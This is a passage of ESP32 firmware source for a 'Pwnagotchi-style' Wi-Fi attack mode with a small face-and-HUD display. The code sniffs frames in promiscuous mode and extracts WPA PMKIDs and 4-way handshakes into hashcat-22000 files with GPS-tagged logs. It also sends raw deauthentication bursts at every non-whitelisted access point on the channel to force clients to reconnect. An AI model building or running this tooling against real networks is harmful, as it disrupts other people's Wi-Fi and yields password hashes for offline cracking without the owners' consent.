static uint32_t uptimeAccumMs  = 0;     // session-local ms credited to totalUptimeS

static void defaultName(char out[17]) {
  uint8_t mac[6] = {0};
  esp_read_mac(mac, ESP_MAC_WIFI_STA);
  // Pwnagotchi-style two-syllable name seeded by MAC last 3 bytes.
  static const char* syl[] = {
    "div","pwn","kai","zen","ash","rin","nox","vex","lux","jin",
    "kai","mio","tau","ren","yuu","oni","ryo","aki","sei","ume"
  };
  uint32_t s = ((uint32_t)mac[3] << 16) | ((uint32_t)mac[4] << 8) | mac[5];
  const char* a = syl[s % 20];
  const char* b = syl[(s >> 5) % 20];
  snprintf(out, 17, "%s-%s%02X", a, b, mac[5]);
}

static void persistEnsureDir() {
  if (!SD.exists(PWN_DIR)) SD.mkdir(PWN_DIR);
}

static void persistLoad() {
  memset(&persist, 0, sizeof(persist));
  if (!sdReady) {
    defaultName(persist.name);
    return;
  }
  File f = SD.open(PWN_STATE_PATH, FILE_READ);
  if (!f) {
    defaultName(persist.name);
    return;
  }
  StaticJsonDocument<512> doc;
  DeserializationError err = deserializeJson(doc, f);
  f.close();
  if (err) {
    defaultName(persist.name);
    return;
  }
  const char* nm = doc["name"] | "";
  if (nm[0]) { strncpy(persist.name, nm, 16); persist.name[16] = 0; }
  else       { defaultName(persist.name); }
  persist.totalHandshakes = doc["handshakes"] | 0u;
  persist.totalPmkids     = doc["pmkids"]     | 0u;
  persist.totalUptimeS    = doc["uptime_s"]   | 0u;
  persist.sessions        = doc["sessions"]   | 0u;
  persist.bestSession     = doc["best"]       | 0u;
}

static void persistSaveNow() {
  if (!sdReady) return;
  persistEnsureDir();
  File f = SD.open(PWN_STATE_PATH, FILE_WRITE);
  if (!f) return;
  StaticJsonDocument<512> doc;
  doc["name"]       = persist.name;
  doc["handshakes"] = persist.totalHandshakes;
  doc["pmkids"]     = persist.totalPmkids;
  doc["uptime_s"]   = persist.totalUptimeS;
  doc["sessions"]   = persist.sessions;
  doc["best"]       = persist.bestSession;
  serializeJson(doc, f);
  f.close();
  persistDirty = false;
  lastSaveMs   = millis();
}

static void persistMaybeSave(uint32_t now) {
  if (!persistDirty) return;
  if ((uint32_t)(now - lastSaveMs) < PWN_SAVE_MIN_MS) return;
  persistSaveNow();
}

static void persistTickUptime(uint32_t now) {
  static uint32_t lastTickMs = 0;
  if (lastTickMs == 0) { lastTickMs = now; return; }
  uint32_t dt = now - lastTickMs;
  lastTickMs = now;
  uptimeAccumMs += dt;
  while (uptimeAccumMs >= 1000) {
    uptimeAccumMs -= 1000;
    persist.totalUptimeS++;
  }
}

static void formatAge(uint32_t s, char* out, size_t cap) {
  uint32_t d = s / 86400; s %= 86400;
  uint32_t h = s / 3600;  s %= 3600;
  uint32_t m = s / 60;
  if (d > 0)      snprintf(out, cap, "%lud %02luh", (unsigned long)d, (unsigned long)h);
  else if (h > 0) snprintf(out, cap, "%luh %02lum", (unsigned long)h, (unsigned long)m);
  else            snprintf(out, cap, "%lum",        (unsigned long)m);
}

// ── Minimal NMEA reader (RMC + GGA) for GPS-tagged captures ──────────────────
static HardwareSerial pwnGps(2);
static bool     gpsEnabled        = false;
static bool     gpsFixValid       = false;
static double   gpsLat            = 0.0;
static double   gpsLon            = 0.0;
static char     gpsUtc[10]        = "--:--:--";
static char     gpsDate[10]       = "--/--/--";
static uint8_t  gpsFixQ           = 0;       // GGA fix quality
static uint8_t  gpsSatsUsed       = 0;
static uint32_t gpsLastFixMs      = 0;
static char     gpsLineBuf[100];
static uint8_t  gpsLineLen        = 0;

static double pwnDmToDeg(const char* dm, char dir) {
  if (!dm || !*dm) return 0.0;
  double v = strtod(dm, nullptr);
  int deg = (int)(v / 100.0);
  double mins = v - (double)deg * 100.0;
  double dec = (double)deg + mins / 60.0;
  if (dir == 'S' || dir == 'W') dec = -dec;
  return dec;
}

static void pwnParseRmc(char* s) {
  // $..RMC,utc,status,lat,N/S,lon,E/W,sog,cog,date,...
  const char* f[14] = {0};
  int nf = 0; f[nf++] = s;
  for (char* p = s; *p && nf < 14; ++p) {
    if (*p == ',') { *p = 0; f[nf++] = p + 1; }
    else if (*p == '*') { *p = 0; break; }
  }
  if (nf < 10) return;
  if (f[1] && strlen(f[1]) >= 6) {
    snprintf(gpsUtc, sizeof(gpsUtc), "%c%c:%c%c:%c%c",
             f[1][0], f[1][1], f[1][2], f[1][3], f[1][4], f[1][5]);
  }
  gpsFixValid = (f[2] && f[2][0] == 'A');
  if (gpsFixValid && f[3] && f[5]) {
    gpsLat = pwnDmToDeg(f[3], f[4] ? f[4][0] : 0);
    gpsLon = pwnDmToDeg(f[5], f[6] ? f[6][0] : 0);
    gpsLastFixMs = millis();
  }
  if (f[9] && strlen(f[9]) >= 6) {
    snprintf(gpsDate, sizeof(gpsDate), "%c%c/%c%c/%c%c",
             f[9][0], f[9][1], f[9][2], f[9][3], f[9][4], f[9][5]);
  }
}

static void pwnParseGga(char* s) {
  // $..GGA,utc,lat,N/S,lon,E/W,fixQ,nSats,...
  const char* f[10] = {0};
  int nf = 0; f[nf++] = s;
  for (char* p = s; *p && nf < 10; ++p) {
    if (*p == ',') { *p = 0; f[nf++] = p + 1; }
    else if (*p == '*') { *p = 0; break; }
  }
  if (nf < 8) return;
  gpsFixQ     = f[6] ? (uint8_t)strtol(f[6], nullptr, 10) : 0;
  gpsSatsUsed = f[7] ? (uint8_t)strtol(f[7], nullptr, 10) : 0;
}

static void pwnGpsDispatch(char* line) {
  if (line[0] != '$' || strlen(line) < 7) return;
  if (line[3] == 'R' && line[4] == 'M' && line[5] == 'C') pwnParseRmc(line);
  else if (line[3] == 'G' && line[4] == 'G' && line[5] == 'A') pwnParseGga(line);
}

static void pwnGpsFeed() {
  if (!gpsEnabled) return;
  while (pwnGps.available()) {
    char c = (char)pwnGps.read();
    if (c == '\n') {
      gpsLineBuf[gpsLineLen] = 0;
      if (gpsLineLen > 0) pwnGpsDispatch(gpsLineBuf);
      gpsLineLen = 0;
    } else if (c == '\r') {
      continue;
    } else if (gpsLineLen + 1 < sizeof(gpsLineBuf)) {
      gpsLineBuf[gpsLineLen++] = c;
    } else {
      gpsLineLen = 0;
    }
  }
}

static void pwnGpsBegin() {
  GpsWardriver::stopBackgroundIfRunning();
  pwnGps.end();
  pwnGps.begin(9600, SERIAL_8N1, GPS_UART_RX, GPS_UART_TX);
  gpsEnabled  = true;
  gpsFixValid = false;
  gpsLineLen  = 0;
  gpsFixQ = 0; gpsSatsUsed = 0;
  strncpy(gpsUtc,  "--:--:--", sizeof(gpsUtc));
  strncpy(gpsDate, "--/--/--", sizeof(gpsDate));
}

static void pwnGpsEnd() {
  if (!gpsEnabled) return;
  pwnGps.end();
  gpsEnabled = false;
}

// ── CSV capture log (parallel to handshakes.22000) ───────────────────────────
static constexpr const char* PWN_CSV_PATH = "/captures/handshakes.csv";
static void ensureCapturesDir();   // defined below
static void friendUpsert(const uint8_t* bssid, const char* name,
                         uint32_t lifetime, int8_t rssi);
static bool parseFriendBeacon(const uint8_t* p, int len,
                              char outName[17], uint32_t* outLifetime);

static void appendCsvLine(const char* kind,
                          const BssidEntry& ap,
                          const uint8_t* sta) {
  ensureCapturesDir();
  bool fresh = !SD.exists(PWN_CSV_PATH);
  File f = SD.open(PWN_CSV_PATH, FILE_APPEND);
  if (!f) return;
  if (fresh) {
    f.println("type,utc,date,bssid,ssid,channel,sta,lat,lon,fixq,sats");
  }
  char bssidStr[18], staStr[18];
  snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]);
  snprintf(staStr, sizeof(staStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);

  // SSID sanitization: drop commas and quotes so CSV stays simple.
  char safeSsid[40] = {0};
  size_t j = 0;
  for (size_t i = 0; ap.ssid[i] && j + 1 < sizeof(safeSsid); i++) {
    char c = ap.ssid[i];
    if (c == ',' || c == '"' || c < 0x20) c = '_';
    safeSsid[j++] = c;
  }

  if (gpsFixValid) {
    f.printf("%s,%s,%s,%s,%s,%u,%s,%.6f,%.6f,%u,%u\n",
             kind, gpsUtc, gpsDate, bssidStr, safeSsid,
             (unsigned)ap.channel, staStr, gpsLat, gpsLon,
             (unsigned)gpsFixQ, (unsigned)gpsSatsUsed);
  } else {
    f.printf("%s,%s,%s,%s,%s,%u,%s,,,0,0\n",
             kind, gpsUtc, gpsDate, bssidStr, safeSsid,
             (unsigned)ap.channel, staStr);
  }
  f.close();
}

// ── Face glyph strings (centered, monospace) ─────────────────────────────────
static const char* faceStr(Face f) {
  switch (f) {
    case Face::IDLE:  return "( -_- )";
    case Face::WATCH: return "( o_o )";
    case Face::HAPPY: return "( ^_^ )";
    case Face::SAD:   return "( T_T )";
    case Face::ANGRY: return "(>_<#)";
  }
  return "( ?_? )";
}

// ── BSSID table helpers ───────────────────────────────────────────────────────
static BssidEntry* upsertBssid(const uint8_t* bssid, const char* ssid, uint8_t ch) {
  for (int i = 0; i < bssidCount; i++) {
    if (memcmp(bssidTbl[i].bssid, bssid, 6) == 0) {
      if (ssid && ssid[0] && bssidTbl[i].ssid[0] == 0) {
        strncpy(bssidTbl[i].ssid, ssid, 32);
        bssidTbl[i].ssid[32] = 0;
      }
      if (ch) bssidTbl[i].channel = ch;
      return &bssidTbl[i];
    }
  }
  if (bssidCount >= PWN_MAX_BSSIDS) return nullptr;
  BssidEntry* e = &bssidTbl[bssidCount++];
  memcpy(e->bssid, bssid, 6);
  if (ssid) { strncpy(e->ssid, ssid, 32); e->ssid[32] = 0; }
  else      { e->ssid[0] = 0; }
  e->channel = ch;
  return e;
}

// ── In-flight handshake slot mgmt ─────────────────────────────────────────────
static InFlight* findInflight(const uint8_t* bssid, const uint8_t* client) {
  for (int i = 0; i < PWN_INFLIGHT; i++) {
    if ((inflight[i].has_m1 || inflight[i].has_m2)
        && memcmp(inflight[i].bssid, bssid, 6) == 0
        && memcmp(inflight[i].client, client, 6) == 0) {
      return &inflight[i];
    }
  }
  return nullptr;
}
static InFlight* allocInflight(const uint8_t* bssid, const uint8_t* client) {
  InFlight* s = findInflight(bssid, client);
  if (s) {
    memset(s, 0, sizeof(*s));
    memcpy(s->bssid, bssid, 6);
    memcpy(s->client, client, 6);
    return s;
  }
  s = &inflight[inflightNext];
  inflightNext = (inflightNext + 1) % PWN_INFLIGHT;
  memset(s, 0, sizeof(*s));
  memcpy(s->bssid, bssid, 6);
  memcpy(s->client, client, 6);
  return s;
}

// ── hashcat-22000 writers ────────────────────────────────────────────────────
static void writeHex(File& f, const uint8_t* data, int n) {
  for (int i = 0; i < n; i++) {
    char b[3]; snprintf(b, sizeof(b), "%02x", data[i]); f.print(b);
  }
}
static void writeAsciiHex(File& f, const char* s) {
  for (int i = 0; s[i]; i++) {
    char b[3]; snprintf(b, sizeof(b), "%02x", (uint8_t)s[i]); f.print(b);
  }
}
static void ensureCapturesDir() {
  if (!SD.exists("/captures")) SD.mkdir("/captures");
}

static void writePmkid(const BssidEntry& ap, const uint8_t* sta, const uint8_t pmkid[16]) {
  ensureCapturesDir();
  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
  if (!f) return;
  f.print("WPA*01*"); writeHex(f, pmkid, 16);
  f.print("*");       writeHex(f, ap.bssid, 6);
  f.print("*");       writeHex(f, sta, 6);
  f.print("*");       writeAsciiHex(f, ap.ssid);
  f.println("***");
  f.close();
  pmkidCount++;
  persist.totalPmkids++;
  persistDirty = true;
  lastCaptureMs = millis();
  appendCsvLine("PMKID", ap, sta);
}
static void writeHandshake(const BssidEntry& ap, const InFlight& s) {
  if (!s.has_m1 || !s.has_m2 || s.m2_eapol_len < 99) return;
  uint8_t m2[256]; memcpy(m2, s.m2_eapol, s.m2_eapol_len);
  uint8_t mic[16]; memcpy(mic, &m2[81], 16); memset(&m2[81], 0, 16);
  ensureCapturesDir();
  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
  if (!f) return;
  f.print("WPA*02*"); writeHex(f, mic, 16);
  f.print("*");       writeHex(f, ap.bssid, 6);
  f.print("*");       writeHex(f, s.client, 6);
  f.print("*");       writeAsciiHex(f, ap.ssid);
  f.print("*");       writeHex(f, s.anonce, 32);
  f.print("*");       writeHex(f, m2, s.m2_eapol_len);
  f.println("*00");
  f.close();
  handshakeCount++;
  persist.totalHandshakes++;
  persistDirty = true;
  lastCaptureMs = millis();
  appendCsvLine("HS", ap, s.client);
}

// ── RSN/WPA Key Data: extract PMKID-KDE (OUI 00-0F-AC type 4) ────────────────
static bool extractPmkid(const uint8_t* kd, int kdLen, uint8_t out[16]) {
  int i = 0;
  while (i + 2 <= kdLen) {
    uint8_t tag = kd[i], len = kd[i + 1];
    if (i + 2 + len > kdLen) return false;
    if (tag == 0xDD && len >= 4 + 16
        && kd[i + 2] == 0x00 && kd[i + 3] == 0x0F
        && kd[i + 4] == 0xAC && kd[i + 5] == 0x04) {
      memcpy(out, &kd[i + 6], 16);
      return true;
    }
    i += 2 + len;
  }
  return false;
}

// ── Parse beacon tagged params: SSID (tag 0) + DS channel (tag 3) ────────────
static void parseBeacon(const uint8_t* p, int len, char* outSsid, uint8_t* outCh) {
  outSsid[0] = 0;
  *outCh = 0;
  if (len < 36) return;             // 24 hdr + 12 fixed beacon body
  int i = 36;
  while (i + 2 <= len) {
    uint8_t tag = p[i], tlen = p[i + 1];
    if (i + 2 + tlen > len) return;
    if (tag == 0x00 && tlen <= 32) {
      memcpy(outSsid, &p[i + 2], tlen);
      outSsid[tlen] = 0;
    } else if (tag == 0x03 && tlen == 1) {
      *outCh = p[i + 2];
    }
    i += 2 + tlen;
  }
}

// ── Promiscuous RX ───────────────────────────────────────────────────────────
static void rxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  framesSeen++;

  uint8_t fc0 = p[0], fc1 = p[1];
  uint8_t frame_type = (fc0 >> 2) & 0x3;
  uint8_t subtype    = (fc0 >> 4) & 0xF;

  // Beacon: type=0, subtype=8 (frame ctrl byte 0x80 in upper bits)
  if (type == WIFI_PKT_MGMT && frame_type == 0 && subtype == 8) {
    beaconsSeen++;
    const uint8_t* bssid = p + 16;
    char ssid[33]; uint8_t ch = 0;
    parseBeacon(p, len, ssid, &ch);
    upsertBssid(bssid, ssid[0] ? ssid : nullptr, ch ? ch : currentChannel);

    // Skip our own beacon (we transmit broadcasts with our MAC).
    uint8_t self[6]; esp_read_mac(self, ESP_MAC_WIFI_STA);
    if (memcmp(bssid, self, 6) != 0) {
      char fname[17]; uint32_t flife = 0;
      if (parseFriendBeacon(p, len, fname, &flife)) {
        friendUpsert(bssid, fname, flife, pkt->rx_ctrl.rssi);
      }
    }
    return;
  }

  // EAPOL lives in data frames only.
  if (frame_type != 2) return;
  bool isQoS = (subtype & 0x08) != 0;
  int hdrLen = isQoS ? 26 : 24;
  if (len < hdrLen + 8) return;

  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;
  const uint8_t *dst = nullptr, *src = nullptr, *bssid = nullptr;
  if      (!toDS && !fromDS) { dst = p + 4;  src = p + 10; bssid = p + 16; }
  else if (!toDS &&  fromDS) { dst = p + 4;  bssid = p + 10; src = p + 16; }
  else if ( toDS && !fromDS) { bssid = p + 4; src = p + 10; dst = p + 16; }
  else return;

  const uint8_t* snap = p + hdrLen;
  if (snap[0] != 0xAA || snap[1] != 0xAA || snap[2] != 0x03) return;
  if (snap[6] != 0x88 || snap[7] != 0x8E) return;

  const uint8_t* eapol = snap + 8;
  int eapolLen = len - hdrLen - 8;
  if (eapolLen < 99) return;
  if (eapol[1] != 0x03) return;
  if (eapol[4] != 0x02 && eapol[4] != 0xFE) return;
  eapolSeen++;

  uint16_t keyInfo = ((uint16_t)eapol[5] << 8) | eapol[6];
  bool kiKeyType = (keyInfo & 0x0008) != 0;
  bool kiInstall = (keyInfo & 0x0040) != 0;
  bool kiKeyAck  = (keyInfo & 0x0080) != 0;
  bool kiMic     = (keyInfo & 0x0100) != 0;
  if (!kiKeyType) return;

  bool isM1 = kiKeyAck && !kiMic && !kiInstall;
  bool isM2 = !kiKeyAck && kiMic && !kiInstall;
  const uint8_t* nonce = &eapol[17];
  uint16_t kdLen = ((uint16_t)eapol[97] << 8) | eapol[98];

  BssidEntry* ap = upsertBssid(bssid, nullptr, currentChannel);
  if (!ap) return;

  if (isM1) {
    const uint8_t* client = dst;
    InFlight* s = allocInflight(bssid, client);
    memcpy(s->anonce, nonce, 32);
    s->has_m1 = true;
    if (kdLen > 0 && (int)kdLen <= eapolLen - 99) {
      uint8_t pmkid[16];
      if (extractPmkid(&eapol[99], kdLen, pmkid) && sdReady) {
        writePmkid(*ap, client, pmkid);
      }
    }
  } else if (isM2) {
    const uint8_t* client = src;
    InFlight* s = findInflight(bssid, client);
    if (!s) return;
    if (eapolLen > (int)sizeof(s->m2_eapol)) return;
    memcpy(s->m2_eapol, eapol, eapolLen);
    s->m2_eapol_len = eapolLen;
    s->has_m2 = true;
    if (sdReady) writeHandshake(*ap, *s);
    memset(s, 0, sizeof(*s));
  }
}

// ── Friend detection (vendor IE in beacons) ──────────────────────────────────
// Custom vendor-OUI signature so other Dark-Div Pwns recognize each other.
static constexpr uint8_t PWN_OUI[3]      = {0xDA, 0x4B, 0x01};
static constexpr uint8_t PWN_VENDOR_TYPE = 0x70;     // 'p' for "pwn"
static constexpr int     PWN_MAX_FRIENDS = 8;
static constexpr uint32_t PWN_FRIEND_TX_INTERVAL_MS = 5000;
static constexpr uint32_t PWN_FRIEND_TTL_MS         = 60000;

struct Friend {
  uint8_t  bssid[6];
  char     name[17];
  int8_t   rssi;
  uint32_t lifetime;    // their reported lifetime captures
  uint32_t lastSeenMs;
};
static Friend   friends[PWN_MAX_FRIENDS] = {};
static int      friendCount              = 0;
static uint32_t lastFriendTxMs           = 0;

static void friendUpsert(const uint8_t* bssid, const char* name,
                         uint32_t lifetime, int8_t rssi) {
  uint32_t now = millis();
  for (int i = 0; i < friendCount; i++) {
    if (memcmp(friends[i].bssid, bssid, 6) == 0) {
      strncpy(friends[i].name, name, 16); friends[i].name[16] = 0;
      friends[i].lifetime   = lifetime;
      friends[i].rssi       = rssi;
      friends[i].lastSeenMs = now;
      return;
    }
  }
  int slot = friendCount;
  if (slot >= PWN_MAX_FRIENDS) {
    // Evict the oldest.
    slot = 0;
    for (int i = 1; i < friendCount; i++)
      if (friends[i].lastSeenMs < friends[slot].lastSeenMs) slot = i;
  } else {
    friendCount++;
  }
  memcpy(friends[slot].bssid, bssid, 6);
  strncpy(friends[slot].name, name, 16); friends[slot].name[16] = 0;
  friends[slot].lifetime   = lifetime;
  friends[slot].rssi       = rssi;
  friends[slot].lastSeenMs = now;
}

static void friendsExpire() {
  uint32_t now = millis();
  int w = 0;
  for (int i = 0; i < friendCount; i++) {
    if ((uint32_t)(now - friends[i].lastSeenMs) <= PWN_FRIEND_TTL_MS) {
      if (w != i) friends[w] = friends[i];
      w++;
    }
  }
  friendCount = w;
}

// Tries to extract our vendor IE from a beacon's tagged params.
static bool parseFriendBeacon(const uint8_t* p, int len,
                              char outName[17], uint32_t* outLifetime) {
  if (len < 36) return false;
  int i = 36;
  while (i + 2 <= len) {
    uint8_t tag = p[i], tlen = p[i + 1];
    if (i + 2 + tlen > len) return false;
    if (tag == 0xDD && tlen >= 4 + 1 + 4
        && p[i + 2] == PWN_OUI[0] && p[i + 3] == PWN_OUI[1]
        && p[i + 4] == PWN_OUI[2] && p[i + 5] == PWN_VENDOR_TYPE) {
      const uint8_t* payload = &p[i + 6];
      int payLen = tlen - 4;            // OUI(3)+type(1) consumed
      // Layout: name_len(1) + name(name_len) + lifetime_be32(4)
      if (payLen < 1) return false;
      int nameLen = payload[0];
      if (nameLen < 0 || nameLen > 16) return false;
      if (payLen < 1 + nameLen + 4) return false;
      memcpy(outName, &payload[1], nameLen);
      outName[nameLen] = 0;
      const uint8_t* lp = &payload[1 + nameLen];
      *outLifetime = ((uint32_t)lp[0] << 24) | ((uint32_t)lp[1] << 16)
                   | ((uint32_t)lp[2] << 8)  |  (uint32_t)lp[3];
      return true;
    }
    i += 2 + tlen;
  }
  return false;
}

static void transmitFriendBeacon() {
  uint8_t buf[128] = {0};
  int n = 0;

  // 802.11 mgmt header — beacon (type=0, subtype=8).
  buf[n++] = 0x80; buf[n++] = 0x00;          // Frame Control
  buf[n++] = 0x00; buf[n++] = 0x00;          // Duration
  for (int i = 0; i < 6; i++) buf[n++] = 0xFF;       // DA: broadcast
  uint8_t mac[6]; esp_read_mac(mac, ESP_MAC_WIFI_STA);
  for (int i = 0; i < 6; i++) buf[n++] = mac[i];      // SA
  for (int i = 0; i < 6; i++) buf[n++] = mac[i];      // BSSID (our MAC)
  buf[n++] = 0x00; buf[n++] = 0x00;                   // Seq ctrl

  // Fixed beacon body.
  for (int i = 0; i < 8; i++) buf[n++] = 0;           // timestamp
  buf[n++] = 0x64; buf[n++] = 0x00;                   // beacon interval (100 TU)
  buf[n++] = 0x01; buf[n++] = 0x04;                   // cap info (ESS+ShortPreamble)

  // Tag 0: SSID = "DivPwn:<name>"
  char ssid[33];
  int slen = snprintf(ssid, sizeof(ssid), "DivPwn:%s", persist.name);
  if (slen > 32) slen = 32;
  buf[n++] = 0x00; buf[n++] = (uint8_t)slen;
  memcpy(&buf[n], ssid, slen); n += slen;

  // Tag 1: Supported rates (mandatory in most decoders).
  buf[n++] = 0x01; buf[n++] = 0x01; buf[n++] = 0x82;  // 1 Mbit basic

  // Tag 3: DS Parameter — current channel.
  buf[n++] = 0x03; buf[n++] = 0x01; buf[n++] = currentChannel;

  // Tag 0xDD: vendor IE — OUI + type + payload.
  uint32_t lifetime = persist.totalHandshakes + persist.totalPmkids;
  int nameLen = (int)strlen(persist.name);
  if (nameLen > 16) nameLen = 16;
  uint8_t ieLen = (uint8_t)(3 + 1 + 1 + nameLen + 4);
  buf[n++] = 0xDD; buf[n++] = ieLen;
  buf[n++] = PWN_OUI[0]; buf[n++] = PWN_OUI[1]; buf[n++] = PWN_OUI[2];
  buf[n++] = PWN_VENDOR_TYPE;
  buf[n++] = (uint8_t)nameLen;
  memcpy(&buf[n], persist.name, nameLen); n += nameLen;
  buf[n++] = (uint8_t)((lifetime >> 24) & 0xFF);
  buf[n++] = (uint8_t)((lifetime >> 16) & 0xFF);
  buf[n++] = (uint8_t)((lifetime >>  8) & 0xFF);
  buf[n++] = (uint8_t)( lifetime        & 0xFF);

  Deauther::wsl_bypasser_send_raw_frame(buf, n);
}

// ── Whitelist (SD /pwn/whitelist.txt) ────────────────────────────────────────
static constexpr const char* PWN_WHITELIST_PATH = "/pwn/whitelist.txt";
static constexpr int  PWN_WHITELIST_MAX_BSSID = 16;
static constexpr int  PWN_WHITELIST_MAX_SSID  = 16;
static uint8_t whitelistBssid[PWN_WHITELIST_MAX_BSSID][6];
static int     whitelistBssidCount = 0;
static char    whitelistSsid[PWN_WHITELIST_MAX_SSID][33];
static int     whitelistSsidCount = 0;

static bool parseMac(const char* s, uint8_t out[6]) {
  unsigned v[6];
  if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
    return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
  return true;
}

static void loadWhitelist() {
  whitelistBssidCount = 0;
  whitelistSsidCount  = 0;
  if (!sdReady) return;
  File f = SD.open(PWN_WHITELIST_PATH, FILE_READ);
  if (!f) return;
  char line[64];
  while (f.available()) {
    int n = f.readBytesUntil('\n', line, sizeof(line) - 1);
    if (n <= 0) break;
    line[n] = 0;
    while (n > 0 && (line[n - 1] == '\r' || line[n - 1] == ' ' || line[n - 1] == '\t')) line[--n] = 0;
    char* p = line;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == 0 || *p == '#') continue;
    uint8_t mac[6];
    if (parseMac(p, mac)) {
      if (whitelistBssidCount < PWN_WHITELIST_MAX_BSSID)
        memcpy(whitelistBssid[whitelistBssidCount++], mac, 6);
    } else {
      if (whitelistSsidCount < PWN_WHITELIST_MAX_SSID) {
        strncpy(whitelistSsid[whitelistSsidCount], p, 32);
        whitelistSsid[whitelistSsidCount][32] = 0;
        whitelistSsidCount++;
      }
    }
  }
  f.close();
}

static bool isWhitelisted(const BssidEntry& ap) {
  for (int i = 0; i < whitelistBssidCount; i++) {
    if (memcmp(whitelistBssid[i], ap.bssid, 6) == 0) return true;
  }
  if (ap.ssid[0]) {
    for (int i = 0; i < whitelistSsidCount; i++) {
      if (strcmp(whitelistSsid[i], ap.ssid) == 0) return true;
    }
  }
  return false;
}

// ── Adaptive channel scheduler ───────────────────────────────────────────────
static constexpr int      PWN_CH_MIN          = 1;
static constexpr int      PWN_CH_MAX          = 13;
static constexpr uint32_t PWN_DWELL_MIN_MS    = 3000;
static constexpr uint32_t PWN_DWELL_MAX_MS    = 12000;
static constexpr int      PWN_COOLDOWN_MAX    = 3;     // visits to skip when empty

struct ChanStat {
  uint16_t score;        // last-visit activity (eapol*4 + beacons + apsHere)
  uint8_t  cooldown;     // visits remaining before this channel is reconsidered
};
static ChanStat chanStats[PWN_CH_MAX + 2] = {};
static uint32_t curDwellMs                = PWN_CHANNEL_DWELL_MS;
static uint32_t snapEapol                 = 0;
static uint32_t snapBeacons               = 0;

static int apsOnChannel(uint8_t ch) {
  int n = 0;
  for (int i = 0; i < bssidCount; i++) if (bssidTbl[i].channel == ch) n++;
  return n;
}

static void closeOutChannel() {
  uint16_t dEapol   = (uint16_t)(eapolSeen   - snapEapol);
  uint16_t dBeacons = (uint16_t)(beaconsSeen - snapBeacons);
  uint16_t score    = (uint16_t)(dEapol * 4 + dBeacons + apsOnChannel(currentChannel));
  if (currentChannel >= PWN_CH_MIN && currentChannel <= PWN_CH_MAX) {
    chanStats[currentChannel].score    = score;
    chanStats[currentChannel].cooldown = (score == 0)
      ? (uint8_t)min<int>(chanStats[currentChannel].cooldown + 1, PWN_COOLDOWN_MAX)
      : 0;
  }
  // Adapt next dwell: extend on hot channels, contract on empty ones.
  if      (score >= 8)  curDwellMs = PWN_DWELL_MAX_MS;
  else if (score >= 2)  curDwellMs = PWN_CHANNEL_DWELL_MS;
  else                  curDwellMs = PWN_DWELL_MIN_MS;
}

static uint8_t pickNextChannel() {
  uint8_t start = (currentChannel >= PWN_CH_MAX) ? PWN_CH_MIN : (uint8_t)(currentChannel + 1);
  uint8_t ch    = start;
  for (int tries = 0; tries < PWN_CH_MAX; tries++) {
    if (chanStats[ch].cooldown == 0) return ch;
    chanStats[ch].cooldown--;
    ch = (ch >= PWN_CH_MAX) ? PWN_CH_MIN : (uint8_t)(ch + 1);
  }
  // All cooled down — sweep anyway, reset cooldowns.
  for (int i = PWN_CH_MIN; i <= PWN_CH_MAX; i++) chanStats[i].cooldown = 0;
  return start;
}

static void openChannel(uint8_t ch) {
  currentChannel = ch;
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  snapEapol   = eapolSeen;
  snapBeacons = beaconsSeen;
}

// ── Deauth burst across every AP on the current channel ──────────────────────
static void deauthOnCurrentChannel() {
  uint8_t f[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00, 0x07, 0x00
  };
  for (int i = 0; i < bssidCount; i++) {
    if (bssidTbl[i].channel != currentChannel) continue;
    if (isWhitelisted(bssidTbl[i])) continue;
    memcpy(&f[10], bssidTbl[i].bssid, 6);
    memcpy(&f[16], bssidTbl[i].bssid, 6);
    for (int j = 0; j < 6; j++) {
      Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
      delayMicroseconds(1500);
    }
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

// ── UI ───────────────────────────────────────────────────────────────────────
static const uint16_t ARA_RED  = 0xE0E6;
static const uint16_t ARA_MID  = 0x9085;
static const uint16_t ARA_DIM  = 0x6020;
static const uint16_t ARA_GRN  = 0x07C0;

static void drawShell() {
  tft.fillScreen(TFT_BLACK);
  tft.drawFastHLine(0, 0, 240, ARA_RED);
  tft.drawFastHLine(0, 24, 240, ARA_DIM);
  tft.drawFastHLine(0, 296, 240, ARA_DIM);
  tft.drawFastHLine(0, 319, 240, ARA_RED);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(ARA_RED, TFT_BLACK);
  tft.setCursor(72, 6);
  tft.print("[ PWN MODE ]");
  tft.setTextColor(ARA_DIM, TFT_BLACK);
  tft.setCursor(8, 301);
  tft.print("RIGHT=DEAUTH  SEL=BACK");
}

static void drawFace() {
  tft.fillRect(0, 30, 240, 56, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(3);
  tft.setTextColor(ARA_RED, TFT_BLACK);
  const char* face = faceStr(currentFace);
  int fw = tft.textWidth(face);
  tft.setCursor((240 - fw) / 2, 34);
  tft.print(face);
  lastDrawnFace = currentFace;
}

static void drawHud() {
  tft.fillRect(0, 92, 240, 200, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(1);
  char buf[64];
  char age[16];

  // Identity header (name + age).
  formatAge(persist.totalUptimeS, age, sizeof(age));
  tft.setTextColor(ARA_GRN, TFT_BLACK);
  tft.setCursor(10, 94);
